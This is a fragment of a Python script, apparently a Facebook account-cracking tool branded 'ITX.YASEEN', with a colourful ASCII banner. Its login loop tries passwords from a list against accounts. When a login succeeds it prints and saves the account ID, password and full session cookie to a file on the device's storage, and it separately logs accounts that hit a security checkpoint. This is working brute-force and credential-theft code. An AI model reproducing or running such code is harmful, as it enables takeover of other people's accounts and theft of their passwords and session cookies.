...
def clear():
    os.system('clear')
logo =("""\x1b[1;97m  db   dD  .d88b.       db   dD  .d88b.\033[1;91m P
\x1b[1;97m 88 ,8P' .8P  Y8.      88 ,8P' .8P  Y8.\033[1;92m A
\x1b[1;91m 88,8P   88    88      88,8P   88    88\033[1;93m T
\x1b[1;91m 88`8b   88    88      88`8b   88    88\033[1;94m H
\x1b[1;97m 88 `88. `8b  d8'      88 `88. `8b  d8'\033[1;95m A
\x1b[1;97m YP   YD  `Y88P'       YP   YD  `Y88P'\033[1;96m N 
\x1b[1;97m[*]----------------------------------------------
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ITX.YASEEN-,OK-💚]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                print(f"{H} [COOKIE] {coki}")
                open('/sdcard/ITX.YASEEN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[ITX.YASEEN-💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ITX.YASEEN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
                ...
                #open('/sdcard/ARIX-CP.txt', 'a').write( cid+' | '+ps+' \n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s|ITX.YASEEN-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
